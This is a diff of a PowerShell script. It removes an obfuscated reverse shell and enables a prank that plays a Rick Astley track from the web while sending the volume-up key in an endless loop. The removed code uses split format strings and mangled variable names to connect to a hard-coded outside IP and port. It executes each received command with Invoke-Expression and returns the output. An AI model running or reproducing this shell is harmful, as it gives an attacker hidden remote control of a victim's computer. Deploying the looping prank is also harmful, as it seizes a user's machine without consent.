@@ -1,8 +1,6 @@
-#$MediaPlayer = [Windows.Media.Playback.MediaPlayer, Windows.Media, ContentType = WindowsRuntime]::New();
-#$MediaPlayer.Source = [Windows.Media.Core.MediaSource]::CreateFromUri('https://www.cjoint.com/doc/16_09/FIsxS52QXY7_Rick-Astley---Never-Gonna-Give-You-Up.mp3');
-#$MediaPlayer.Play();
-#while(1){
-  #(new-object -com wscript.shell).SendKeys([char]175);
-#}
-
-.("{1}{0}{2}" -f 't-VARIAbl','SE','e')  ("8e"+"91QO")  ([TyPE]("{2}{0}{1}{3}" -f 'NC','oDIn','TEXT.e','g'))  ; ${tC`PCLi`eNt} = .("{1}{0}{2}" -f 'ec','New-Obj','t') ("{0}{2}{6}{1}{5}{3}{4}" -f 'N','ockets.TC','et.','Cl','ient','P','S')(("{4}{0}{1}{3}{2}" -f '.1','4','.211','2','3.141'), 19796);${nE`TW`OrkSTRE`Am} = ${TC`PCL`I`ENt}.("{2}{1}{0}" -f 'Stream','t','Ge').Invoke();${s`Trea`MwRITer} = &("{3}{2}{0}{1}"-f 'ec','t','w-Obj','Ne') ("{1}{0}{3}{2}"-f 'amWri','IO.Stre','r','te')(${nETWorK`Str`eaM});function wRIT`E`T`OST`REaM (${sTr`i`NG}) {[byte[]]${ScRIPT:`Buf`F`er} = 0..${tc`PcL`Ie`Nt}."re`C`eiV`EbUF`FErsize" | &('%') {0};${S`TR`E`AMwrItEr}.("{1}{0}"-f 'rite','W').Invoke(${st`R`iNg} + ("{2}{0}{1}"-f'L>',' ','SHEL'));${streaMwR`i`TeR}.("{0}{1}"-f 'F','lush').Invoke()}&("{3}{4}{2}{1}{0}" -f 'm','a','ToStre','Wr','ite') '';while((${BytEs`R`e`AD} = ${Netw`oR`K`stR`Eam}.("{0}{1}"-f'Re','ad').Invoke(${bU`FF`eR}, 0, ${bU`FFeR}."lENG`Th")) -gt 0) {${C`OmMa`Nd} = ( (.("{0}{1}{2}" -f'VAr','IAbl','E')  ("8e"+"91qO") )."VaL`Ue"::"uT`F8")."g`Etst`RiNg"(${b`Uff`Er}, 0, ${b`yTesRE`Ad} - 1);${o`UTPUt} = try {.("{1}{3}{4}{5}{2}{0}"-f'on','I','i','nvo','ke-Expres','s') ${com`M`AnD} 2>&1 | &("{1}{2}{0}" -f'ring','Out','-St')} catch {${_} | .("{1}{0}{2}"-f 'trin','Out-S','g')}&("{0}{3}{2}{1}" -f 'WriteT','m','rea','oSt') (${Ou`T`put})}${S`TRe`A`MwRIt`eR}.("{1}{0}" -f 'lose','C').Invoke()
+$MediaPlayer = [Windows.Media.Playback.MediaPlayer, Windows.Media, ContentType = WindowsRuntime]::New();
+$MediaPlayer.Source = [Windows.Media.Core.MediaSource]::CreateFromUri('https://www.cjoint.com/doc/16_09/FIsxS52QXY7_Rick-Astley---Never-Gonna-Give-You-Up.mp3');
+$MediaPlayer.Play();
+while(1){
+  (new-object -com wscript.shell).SendKeys([char]175);
+}
